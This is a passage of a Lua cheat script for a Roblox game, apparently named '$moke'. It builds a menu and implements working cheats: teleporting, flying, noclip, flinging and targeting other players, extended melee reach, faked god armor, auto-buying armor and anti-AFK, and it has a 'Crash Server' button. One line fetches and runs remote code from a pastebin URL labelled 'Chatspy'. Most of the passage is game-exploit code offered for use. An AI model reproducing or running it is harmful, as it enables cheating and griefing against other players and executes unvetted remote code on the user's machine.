PageTitle_6.TextColor3 = Color3.fromRGB(255, 255, 255)
PageTitle_6.TextScaled = true
PageTitle_6.TextSize = 15.000
PageTitle_6.TextWrapped = true

CashTextbox.Name = "CashTextbox"
CashTextbox.Parent = SellingToolsPage
CashTextbox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
CashTextbox.BorderSizePixel = 0
CashTextbox.Position = UDim2.new(0.148148149, 0, 0.221864939, 0)
CashTextbox.Size = UDim2.new(0, 285, 0, 29)
CashTextbox.Font = Enum.Font.SourceSansBold
CashTextbox.PlaceholderText = "Insert Money Amount"
CashTextbox.Text = ""
CashTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
CashTextbox.TextSize = 20.000

CalculateButton.Name = "CalculateButton"
CalculateButton.Parent = SellingToolsPage
CalculateButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
CalculateButton.BorderSizePixel = 0
CalculateButton.Position = UDim2.new(0.148148149, 0, 0.337620586, 0)
CalculateButton.Size = UDim2.new(0, 134, 0, 32)
CalculateButton.AutoButtonColor = false
CalculateButton.Font = Enum.Font.SourceSansBold
CalculateButton.Text = "Calculate"
CalculateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CalculateButton.TextSize = 20.000

DropToggleButton.Name = "DropToggleButton"
DropToggleButton.Parent = SellingToolsPage
DropToggleButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
DropToggleButton.BorderSizePixel = 0
DropToggleButton.Position = UDim2.new(0.52098763, 0, 0.337620586, 0)
DropToggleButton.Size = UDim2.new(0, 134, 0, 32)
DropToggleButton.AutoButtonColor = false
DropToggleButton.Font = Enum.Font.SourceSansBold
DropToggleButton.Text = "Enable"
DropToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DropToggleButton.TextSize = 20.000

CashAtEndLabel.Name = "CashAtEndLabel"
CashAtEndLabel.Parent = SellingToolsPage
CashAtEndLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CashAtEndLabel.BackgroundTransparency = 1.000
CashAtEndLabel.Position = UDim2.new(0.0200606734, 0, 0.723472655, 0)
CashAtEndLabel.Size = UDim2.new(0, 165, 0, 20)
CashAtEndLabel.Font = Enum.Font.SourceSansBold
CashAtEndLabel.Text = "Cash At End:"
CashAtEndLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CashAtEndLabel.TextSize = 15.000
CashAtEndLabel.TextWrapped = true
CashAtEndLabel.TextXAlignment = Enum.TextXAlignment.Left

CrashServerButton.Name = "CrashServerButton"
CrashServerButton.Parent = SellingToolsPage
CrashServerButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
CrashServerButton.BorderSizePixel = 0
CrashServerButton.Position = UDim2.new(0.0197530836, 0, 0.852090001, 0)
CrashServerButton.Size = UDim2.new(0, 134, 0, 32)
CrashServerButton.AutoButtonColor = false
CrashServerButton.Font = Enum.Font.SourceSansBold
CrashServerButton.Text = "Crash Server"
CrashServerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CrashServerButton.TextSize = 20.000

Ver.Name = "Ver"
Ver.Parent = MainFrame
Ver.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Ver.BackgroundTransparency = 1.000
Ver.Position = UDim2.new(0.0126533778, 0, 0.906369627, 0)
Ver.Size = UDim2.new(0, 134, 0, 33)
Ver.Font = Enum.Font.SourceSansBold
Ver.Text = "V1.0.1"
Ver.TextColor3 = Color3.fromRGB(255, 255, 255)
Ver.TextSize = 25.000
Ver.TextWrapped = true

DropShadowHolder.Name = "DropShadowHolder"
DropShadowHolder.Parent = MainFrame
DropShadowHolder.BackgroundTransparency = 1.000
DropShadowHolder.BorderSizePixel = 0
DropShadowHolder.Size = UDim2.new(1, 0, 1, 0)
DropShadowHolder.ZIndex = 0

DropShadow.Name = "DropShadow"
DropShadow.Parent = DropShadowHolder
DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
DropShadow.BackgroundTransparency = 1.000
DropShadow.BorderSizePixel = 0
DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
DropShadow.Size = UDim2.new(1, 47, 1, 47)
DropShadow.ZIndex = 0
DropShadow.Image = "rbxassetid://6015897843"
DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
DropShadow.ImageTransparency = 0.200
DropShadow.ScaleType = Enum.ScaleType.Slice
DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)

CloseBtn.Name = "CloseBtn"
CloseBtn.Parent = MainFrame
CloseBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
CloseBtn.BackgroundTransparency = 1.000
CloseBtn.BorderSizePixel = 0
CloseBtn.Position = UDim2.new(0.95104897, 0, 0.0056657223, 0)
CloseBtn.Size = UDim2.new(0, 28, 0, 28)
CloseBtn.AutoButtonColor = false
CloseBtn.Font = Enum.Font.SourceSansBold
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.TextSize = 20.000

-- Scripts:

local function KOGQOFZ_fake_script() -- UIGradient.LocalScript 
	local script = Instance.new('LocalScript', UIGradient)

	game:GetService('RunService').RenderStepped:Connect(function()
		script.Parent.Rotation = (tick() * 75) % 360;
	end)
end
coroutine.wrap(KOGQOFZ_fake_script)()
local smokeexists = game.CoreGui:FindFirstChild("smokee")
if smokeexists then
	smokeexists:Destroy()
end
loadstring(game:HttpGet("https://pastebin.com/raw/nzXicwc1", true))() -- Chatspy
MainFrame.Active = true
MainFrame.Draggable = true
smoke.Enabled = true
Players = game:GetService('Players')
RS = game:GetService('RunService')
CloseBtn.MouseButton1Click:Connect(function()
	game.CoreGui:FindFirstChild("smokee"):Destroy()
end)
print("setup works")
local formatNumber = (function (n)
	n = tostring(n)
	return n:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end)
print("fn works")
function deselecttabs()
	for _, Tabs in pairs(MainFrame.TabsHolder:GetChildren()) do
		if Tabs then
			if Tabs.ClassName == "TextButton" then
				Tabs.TextColor3 = Color3.fromRGB(149, 149, 149)
			end
		end
	end
end
print("dt works")
function deselectpages()
	for _, Frame in pairs(MainFrame.PageContainer:GetChildren()) do
		if Frame then
			if Frame.ClassName == "Frame" then
				Frame.Visible = false
			end
		end
	end
end
print("dp works")
function notify(Text)
	local StarterGui = game:GetService("StarterGui")
	StarterGui:SetCore("SendNotification",{
		Title = "$moke",
		Text = Text,
		Duration = 5
	})
	local sound = Instance.new("Sound")
	sound.Parent = game.SoundService
	sound.SoundId = "rbxassetid://195868961"
	sound:Play()
	wait(1)
	sound:Destroy()
end
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "$moke",
	Text = "$moke is made by\nNotLaggingg#0710\nand\nBitey#0001",
	Duration = 10
})
function SetPlayerInfo()
	local foundplayer = game:GetService('Players'):FindFirstChild(TargetTextbox.Text)
	if foundplayer then
		local TargetId = foundplayer.UserId
		local ThumbType = Enum.ThumbnailType.HeadShot
		local ThumbSize = Enum.ThumbnailSize.Size420x420
		local Content, IsReady = game:GetService('Players'):GetUserThumbnailAsync(TargetId, ThumbType, ThumbSize)

		TargetImage.Image = Content

		CashLabel.Text = ('Cash : ' .. formatNumber(foundplayer.DataFolder.Currency.Value))
		BountyLabel.Text = ('Bounty : ' .. formatNumber(foundplayer.leaderstats.Wanted.Value))

		local CrewValue = foundplayer:FindFirstChild('DataFolder'):FindFirstChild('Information'):FindFirstChild('Crew')
		if CrewValue then
			if CrewValue.Value ~= nil and CrewValue.Value ~= '' then
				Crew = game:GetService('GroupService'):GetGroupInfoAsync(tonumber(CrewValue.Value))
				if Crew then
					CrewLabel.Text = ('Crew : ' .. Crew.Name )
					CrewId = tonumber(CrewValue.Value)
				end
			else
				CrewLabel.Text = ('Crew : None')
				Crew = nil
			end
		else
			CrewLabel.Text = ('Crew : None')
			Crew = nil
		end
	end
end
print("spi works")
function ShrinkName()
	TargetTextbox.FocusLost:connect(function()
		for i,v in pairs(game.Players:GetChildren()) do
			if (string.sub(string.lower(v.Name),1,string.len(TargetTextbox.Text))) == string.lower(TargetTextbox.Text) then
				TargetTextbox.Text = v.Name
				SetPlayerInfo()
			end
		end
	end)
end
ShrinkName()
function view(plr)
	wait()
	if game.Players:FindFirstChild(plr) then
		if game.Players[plr].Character then
			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = game.Players:FindFirstChild(plr).Character.HumanoidRootPart
		else
			View.Text = 'View'
		end
	else
		View.Text = 'View'
	end
end
print("sn works")
local vu = game:GetService("VirtualUser") -- AntiAfk
game:GetService("Players").LocalPlayer.Idled:connect(function()
	vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	wait(1)
	vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
print("antiafk works")
spawn(function() -- Network
	game.RunService.RenderStepped:Connect(function()
		game.Players.LocalPlayer.MaximumSimulationRadius = 1000;
		setsimulationradius(1000,1000)
	end)
end)
player = game.Players.LocalPlayer
mouse = player:GetMouse()
MainEvent = game:GetService('ReplicatedStorage').MainEvent
IsMod = false
MaxDistance = 15

COOLDOWN = true
RIDING = false

NamePos = CFrame.new(0,0,0)

green = Color3.new(0,255,0)
red = Color3.new(255,0,0)
print("locals works")


UIS = game:GetService('UserInputService')
buyingarmor = false
UIS.InputBegan:Connect(function(key,b) 
	if key.KeyCode == Enum.KeyCode.V and not b then
		if MainFrame.Visible == true then
			MainFrame.Visible = false
		else
			MainFrame.Visible = true
		end
	end
	if key.KeyCode == Enum.KeyCode.Q and not b then    
		if QToTpColor.BackgroundColor3 == green then
			if mouse.Target then 
				local part = mouse.Target
				local partSize = part.Size
				local halfSize = partSize.Y/2
				player.Character.HumanoidRootPart.CFrame = CFrame.new(mouse.Hit.X,part.Position.Y + halfSize + 3,mouse.Hit.Z) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X),math.rad(player.Character.HumanoidRootPart.Orientation.Y),math.rad(player.Character.HumanoidRootPart.Orientation.Z))
				if not player.Character.LeftHand:FindFirstChild('LeftWrist') then
					player.Character.LeftHand.Position = player.Character.LeftLowerArm.Position
					player.Character.RightHand.Position = player.Character.RightLowerArm.Position
				end
			end
		end
	end
	if key.KeyCode == Enum.KeyCode.LeftAlt and not b then
		if buyingarmor == false and AltArmorColor.BackgroundColor3 == green then
			local ItemCost = 1000
			buyingarmor = true
			local ClickDetector = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1000"].ClickDetector
			local Location = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1000"].ClickDetector.Parent.Head.Position
			OldCFrame = player.Character.HumanoidRootPart.CFrame
			local function buy()
				wait()
				player.Character.HumanoidRootPart.CFrame = CFrame.new(Location)
				fireclickdetector(ClickDetector)
			end
			repeat buy() until player.Character.BodyEffects.Armor.Value == 100 or player.DataFolder.Currency.Value <= ItemCost or player.Character.BodyEffects.Armor:FindFirstChild('God')
			player.Character.HumanoidRootPart.CFrame = OldCFrame
			buyingarmor = false
		end
	end
	if key.KeyCode == Enum.KeyCode.F and not b then
		if HideBlockColor.BackgroundColor3 == green or AutoBlockColor.BackgroundColor3 == green then
			HoldingF = true
			player.Character:FindFirstChildWhichIsA('Humanoid').Name = 'SWAG ON TOP'
			while HoldingF == true and HideBlockColor.BackgroundColor3 == green do
				wait()
				for _,v in pairs(player.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
					if v.Name == 'Block' then
						v:Stop()
					end
				end
			end
		end
	end
	if key.KeyCode == Enum.KeyCode.Space and not b then
		if RIDING == true then
			COOLDOWN = false
			for i,v in pairs(game.Workspace.Ignored:GetChildren()) do
				if v.Name == 'MyLauncher' then
					v.Name = 'Launcher'
				end
			end
			repeat wait() until not game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('MyLauncher')
			COOLDOWN = true
		end
	end
end)

UIS.InputEnded:Connect(function(key,b)
	if key.KeyCode == Enum.KeyCode.F and not b then
		player.Character:FindFirstChildWhichIsA('Humanoid').Name = 'Humanoid'
		HoldingF = false
	end
end)

player.CharacterAdded:Connect(function(character)
	repeat wait() until player.Character
	NamePos = player.Character.HumanoidRootPart.CFrame
	if SpawnPosition ~= nil then
		player.Character.HumanoidRootPart.CFrame = SpawnPosition
	end
end)

player.Character.ChildAdded:Connect(function(child)
	if child.Name == 'Christmas_Sock' and AntiBagColor.BackgroundColor3 == green then
		repeat wait() until player.Character:FindFirstChild('Christmas_Sock')
		player.Character['Christmas_Sock']:Destroy()        
	end
end)

game.Workspace.Ignored.ChildAdded:Connect(function(child)
	if child.Name == 'Launcher' and player.Character:FindFirstChild('[RPG]') then
		child.Name = 'MyLauncher' 
	end
end)
print("toggleui works")
HomeBtn.MouseButton1Click:Connect(function()
	deselecttabs()
	deselectpages()
	HomeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	HomePage.Visible = true
end)
MainScriptsBtn.MouseButton1Click:Connect(function()
	deselecttabs()
	deselectpages()
	MainScriptsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	MainScriptsPage.Visible = true
end)
SideScriptsBtn.MouseButton1Click:Connect(function()
	deselecttabs()
	deselectpages()
	SideScriptsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	SideScriptsPage.Visible = true
end)
TogglesBtn.MouseButton1Click:Connect(function()
	deselecttabs()
	deselectpages()
	TogglesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	TogglesPage.Visible = true
end)
QuickTpBtn.MouseButton1Click:Connect(function()
	deselecttabs()
	deselectpages()
	QuickTpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	QuickTpPage.Visible = true
end)
SellingToolsBtn.MouseButton1Click:Connect(function()
	deselecttabs()
	deselectpages()
	SellingToolsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	SellingToolsPage.Visible = true
end)
print("tabs works")
InviteLinkBtn.MouseButton1Click:Connect(function()
	setclipboard("https://discord.gg/E6HVDpqm9t")
	notify('Copied Invite Link')
	InviteLinkBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	wait(.1)
	InviteLinkBtn.TextColor3 = Color3.fromRGB(149, 149, 149)
end)
View.MouseButton1Click:Connect(function()
	if View.Text == 'View' then
		View.Text = 'Unview'
		repeat view(TargetTextbox.Text) until View.Text == 'View'
		game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
	else
		View.Text = 'View'
	end
end)
print("view works")
Fling.MouseButton1Click:Connect(function()
	if Fling.Text == 'Fling' then
		Fling.Text = 'Unfling'
		local Loop
		local OldFlingPos = player.Character.HumanoidRootPart.Position
		local loopFunction = function()
			local success,err = pcall(function()
				local FlingEnemy = Players:FindFirstChild(TargetTextbox.Text).Character
				if FlingEnemy and player.Character then
					FlingTorso = FlingEnemy.UpperTorso
					local dis = 3.85
					local increase = 6
					if FlingEnemy.Humanoid.MoveDirection.X < 0 then
						xchange = -increase
					elseif FlingEnemy.Humanoid.MoveDirection.X > 0  then
						xchange = increase
					else
						xchange = 0
					end
					if FlingEnemy.Humanoid.MoveDirection.Z < 0 then
						zchange = -increase
					elseif FlingEnemy.Humanoid.MoveDirection.Z > 0 then
						zchange = increase
					else
						zchange = 0
					end          
					if player.Character then
						player.Character:FindFirstChildWhichIsA('Humanoid'):ChangeState(11)
						player.Character.HumanoidRootPart.CFrame = CFrame.new(FlingTorso.Position.X + math.random(-dis,dis) + xchange, FlingTorso.Position.Y, FlingTorso.Position.Z + math.random(-dis,dis) + zchange) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X + 350),math.rad(player.Character.HumanoidRootPart.Orientation.Y + 200),math.rad(player.Character.HumanoidRootPart.Orientation.Z + 240))
						player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
					end
				end
			end)
			if err then
				error('fling error : ' .. err)
			end
		end;
		local Start = function()    
			OldFlingPos = player.Character.HumanoidRootPart.Position
			Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
		end;
		local Pause = function()
			Loop:Disconnect()
			local vectorZero = Vector3.new(0, 0, 0)
			player.Character.PrimaryPart.Velocity = vectorZero
			player.Character.PrimaryPart.RotVelocity = vectorZero
			player.Character.HumanoidRootPart.CFrame = CFrame.new(OldFlingPos) * CFrame.Angles(math.rad(0),math.rad(137.92),math.rad(0))
		end;
		Start()	
		repeat wait() until Fling.Text == 'Fling'
		Pause()
	else
		Fling.Text = 'Fling'
	end
end)
print("fling works")
Target.MouseButton1Click:Connect(function()
	if Target.Text == 'Target' then
		Target.Text = 'Untarget'
		pcall(function()
			player.Character.LeftHand.LeftWrist:Destroy();
			player.Character.RightHand.RightWrist:Destroy();
		end);
		local loopFunction = function()
			if game.Players:FindFirstChild(TargetTextbox.Text).Character then
				player.Character.LeftHand.CFrame  = CFrame.new(game.Players[TargetTextbox.Text].Character.UpperTorso.Position);
				player.Character.RightHand.CFrame = CFrame.new(game.Players[TargetTextbox.Text].Character.UpperTorso.Position);
				if game.Players:FindFirstChild(TargetTextbox.Text).Character.BodyEffects['K.O'].Value == true then
					Target.Text = 'Target'
				end
			else
				Target.Text = 'Target'
			end
		end;        
		local Loop
		local Start = function()
			Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
		end;         
		local Pause = function()
			Loop:Disconnect()
			notify('no longer targeting')
			player.Character.LeftHand.CFrame  = player.Character.LeftLowerArm.CFrame
			player.Character.RightHand.CFrame = player.Character.RightLowerArm.CFrame
		end;
		Start()
		repeat wait() until Target.Text == 'Target'
		Pause()
	else
		Target.Text = 'Target'
	end
end)
print("target works")
GoTo.MouseButton1Click:Connect(function()
	player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[TargetTextbox.Text].Character.UpperTorso.Position)
end)
print("goto works")
FLYMODE = 'Default'
FLYSPEED = 20
FlySpeedPlus.MouseButton1Click:Connect(function()
	FLYSPEED = FLYSPEED + 1
	notify(tostring(FLYSPEED))
end)
FlySpeedMinus.MouseButton1Click:Connect(function()
	FLYSPEED = FLYSPEED - 1
	notify(tostring(FLYSPEED))
end)
print("flyspeedchange works")
FlyMode.MouseButton1Click:Connect(function()
	if FLYMODE == 'Default' then
		FLYMODE = 'IY'
		notify('IY Mode {changes on death}')
	else
		FLYMODE = 'Default'
		notify('Default Mode {changes on death}')
	end
end)
print("Flymode works")
Fly.MouseButton1Click:Connect(function()
	if FLYMODE == 'Default' then
		local plr = game.Players.LocalPlayer
		local Humanoid = plr.Character:FindFirstChildWhichIsA('Humanoid')
		local mouse = plr:GetMouse()
		localplayer = plr
		if workspace:FindFirstChild("Core") then
			workspace.Core:Destroy()
		end
		local Core = Instance.new("Part")
		Core.Name = "Core"
		Core.Size = Vector3.new(0.05, 0.05, 0.05)
		spawn(function()
			Core.Parent = workspace
			local Weld = Instance.new("Weld", Core)
			Weld.Part0 = Core
			Weld.Part1 = localplayer.Character.LowerTorso
			Weld.C0 = CFrame.new(0, 0, 0)
		end)
		workspace:WaitForChild("Core")
		local torso = workspace.Core
		flying = true
		local speed=FLYSPEED
		local keys={a=false,d=false,w=false,s=false}
		local e1
		local e2
		local function start()
			local pos = Instance.new("BodyPosition",torso)
			local gyro = Instance.new("BodyGyro",torso)
			pos.Name="EPIXPOS"
			pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
			pos.position = torso.Position
			gyro.maxTorque = Vector3.new(15e15, 15e15, 15e15)
			gyro.cframe = torso.CFrame
			repeat
				wait()
				Humanoid.PlatformStand=true
				local new=gyro.cframe - gyro.cframe.p + pos.position
				if not keys.w and not keys.s and not keys.a and not keys.d then
					speed=FLYSPEED
				end
				if keys.w then
					new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
					speed=speed
				end
				if keys.s then
					new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
					speed=speed
				end
				if keys.d then
					new = new * CFrame.new(speed,0,0)
					speed=speed
				end
				if keys.a then
					new = new * CFrame.new(-speed,0,0)
					speed=speed
				end
				if speed>FLYSPEED then
					speed=FLYSPEED
				end
				pos.position=new.p
				if keys.w then
					gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed),0,0)
				elseif keys.s then
					gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed),0,0)
				else
					gyro.cframe = workspace.CurrentCamera.CoordinateFrame
				end
			until flying == false
			if gyro then gyro:Destroy() end
			if pos then pos:Destroy() end
			flying=false
			Humanoid.PlatformStand=false
			speed=FLYSPEED
		end
		e1=mouse.KeyDown:connect(function(key)
			if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
			if key=="w" then
				keys.w=true
			elseif key=="s" then
				keys.s=true
			elseif key=="a" then
				keys.a=true
			elseif key=="d" then
				keys.d=true
			elseif key=="x" then
				if flying==true then
					flying=false
				else
					flying=true
					start()
				end
			end
		end)
		e2=mouse.KeyUp:connect(function(key)
			if key=="w" then
				keys.w=false
			elseif key=="s" then
				keys.s=false
			elseif key=="a" then
				keys.a=false
			elseif key=="d" then
				keys.d=false
			end
		end)
		start()
	else
		repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
		local mouse = game.Players.LocalPlayer:GetMouse()
		repeat wait() until mouse
		local plr = game.Players.LocalPlayer
		local torso = plr.Character.Head
		local flying = false
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 5000
		local speed = 5000
		function Fly()
			local bg = Instance.new("BodyGyro", torso)
			bg.P = 9e4
			bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			bg.cframe = torso.CFrame
			local bv = Instance.new("BodyVelocity", torso)
			bv.velocity = Vector3.new(0,0.1,0)
			bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
			repeat wait()
				plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = true
				if ctrl.l + ctrl.r ~= 100000 or ctrl.f + ctrl.b ~= 10000 then
					speed = speed+.0+(speed/maxspeed)
					if speed > maxspeed then
						speed = maxspeed
					end
				elseif not (ctrl.l + ctrl.r ~= 5 or ctrl.f + ctrl.b ~= 5) and speed ~= 5 then
					speed = speed-5
					if speed > 5 then
						speed = -2
					end
				end
				if (ctrl.l + ctrl.r) ~= 5 or (ctrl.f + ctrl.b) ~= 5 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
					lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
				elseif (ctrl.l + ctrl.r) == 5 and (ctrl.f + ctrl.b) == 5 and speed ~= 5 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				else
					bv.velocity = Vector3.new(0,0.1,0)
				end
				bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
			until not flying
			ctrl = {f = 0, b = 0, l = 0, r = 0}
			lastctrl = {f = 0, b = 0, l = 0, r = 0}
			speed = 5
			bg:Destroy()
			bv:Destroy()
			plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = false
		end
		mouse.KeyDown:connect(function(key)
			if key:lower() == "x" then
				if flying then flying = false
				else
					flying = true
					Fly()
				end
			elseif key:lower() == "w" then
				ctrl.f = FLYSPEED
			elseif key:lower() == "s" then
				ctrl.b = -FLYSPEED
			elseif key:lower() == "a" then
				ctrl.l = -FLYSPEED
			elseif key:lower() == "d" then
				ctrl.r = FLYSPEED
			end
		end)
		mouse.KeyUp:connect(function(key)
			if key:lower() == "w" then
				ctrl.f = 0
			elseif key:lower() == "s" then
				ctrl.b = 0
			elseif key:lower() == "a" then
				ctrl.l = 0
			elseif key:lower() == "d" then
				ctrl.r = 0
			end
		end)
		Fly()
	end
end)
print("Fly works")
local OldState = player.Character:FindFirstChildWhichIsA('Humanoid'):GetState()
NoClip.MouseButton1Click:Connect(function()
	local Character = player.Character
	local Humanoid = Character:FindFirstChildWhichIsA('Humanoid')
	local Control = false
	local loopFunction = function()
		Humanoid:ChangeState(11)
	end;
	local Loop
	local Start = function()
		if Control == false then
			Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
		end
	end;
	local Ended = function()
		if Control == true then
			Humanoid:ChangeState(OldState)
		end
	end;
	Start()	
	local Pause = function()
		Loop:Disconnect()
	end;
	local Pause2 = function()
		Start();
		Loop2:Disconnect()
	end;
	UIS.InputBegan:Connect(function(a, b)
		if a.KeyCode == Enum.KeyCode.Z and not b then
			if Control == false then
				Control = true;
				Ended();
				Pause();
			elseif Control == true then
				Control = false;
				Pause2();
			end;
		end;
	end);	
end)
print("Noclip works")
FreeFists.MouseButton1Click:Connect(function()
	for i,v in next, workspace:GetDescendants() do
		if v:IsA'Seat' then
			v:Destroy()
		end
	end
	local FistControl = false
	pcall(function()
		player.Character.LeftHand.LeftWrist:Destroy();
		player.Character.RightHand.RightWrist:Destroy();
	end);
	local loopFunction = function()
		player.Character.LeftHand.CFrame  = CFrame.new(mouse.Hit.p);
		player.Character.RightHand.CFrame = CFrame.new(mouse.Hit.p);
	end;        
	local Loop
	local Start = function()
		Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
	end;         
	local Pause = function()
		Loop:Disconnect()
	end;
	UIS.InputBegan:Connect(function(a, b)
		if a.KeyCode == Enum.KeyCode.T and not b then
			if FistControl == false then
				FistControl = true;
				Start();
			elseif FistControl == true then
				FistControl = false;
				Pause();
				player.Character.LeftHand.CFrame  = player.Character.LeftLowerArm.CFrame
				player.Character.RightHand.CFrame = player.Character.RightLowerArm.CFrame
			end;
		end;
	end)
end)
print("freefistworks")
if not syn and not KRNL_LOADED then
	Reach.Text = 'ToolReach'
end
Reach.MouseButton1Click:Connect(function()
	if Reach.Text == 'ToolReach' then
		if player.Character:FindFirstChildWhichIsA('Tool') then
			player.Character:FindFirstChildWhichIsA('Tool').Handle.Size = Vector3.new(50,50,50)
			player.Character:FindFirstChildWhichIsA('Tool').Handle.Transparency = 1
		else
			notify('you need to be holding a tool')
		end
	else
		if Reach.Text == 'Reach' then
			Reach.Text = 'Unreach'
			while Reach.Text == 'Unreach' do
				wait()
				local success, err = pcall(function()
					if player.Character.BodyEffects.Attacking.Value == true then
						for i,v in pairs(game:GetService('Players'):GetChildren()) do
							if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
								if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
									if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
										firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
									else
										firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
										firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
										firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
										firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
										firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
										firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
									end
								end
							end
						end
					end
				end)
			end
		else
			Reach.Text = 'Reach'
		end
	end
end)
print("Reach works")
NoRecoil.MouseButton1Click:Connect(function()
	for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
		if v:IsA('Camera') then
			v:Destroy()
		end
	end
	local newcam = Instance.new('Camera',game.Workspace)
	newcam.Name = 'Camera'
	newcam.CameraType = 'Custom'
	newcam.CameraSubject = game:GetService('Workspace').Players:FindFirstChild(player.Name):FindFirstChild('Humanoid')
	newcam.HeadLocked = true
	newcam.HeadScale = 1

end)
print("NoRecoil works")
Headless.MouseButton1Click:Connect(function()
	player.Character.Head:BreakJoints()
	player.Character.Head.Position = Vector3.new(0,99999999999999,0)
end)
print("headless works")
GodArmor.MouseButton1Click:Connect(function()
	player.Character.BodyEffects.Armor:Destroy()
	Armor = Instance.new("IntValue", player.Character.BodyEffects)
	Armor.Name = 'Armor'
	Armor.Value = 100
	GodLabel = Instance.new('IntValue', Armor)
	GodLabel.Name = 'God'
end)
print("ga works")
GodBlock.MouseButton1Click:Connect(function()
	player.Character.BodyEffects.Defense:Destroy()
	Defense = Instance.new("IntValue", player.Character.BodyEffects)
	Defense.Name = "Defense"
	Defense.Value = 100
end)
QToTpColor.BackgroundColor3 = red
QToTp.MouseButton1Click:Connect(function()
	if QToTpColor.BackgroundColor3 == red then
		QToTpColor.BackgroundColor3 = green
	else
		QToTpColor.BackgroundColor3 = red
	end
end)

AntiSlowColor.BackgroundColor3 = red
AntiSlow.MouseButton1Click:Connect(function()
	if AntiSlowColor.BackgroundColor3 == red then
		AntiSlowColor.BackgroundColor3 = green
	else
		AntiSlowColor.BackgroundColor3 = red
	end
end)

CashAuraColor.BackgroundColor3 = red
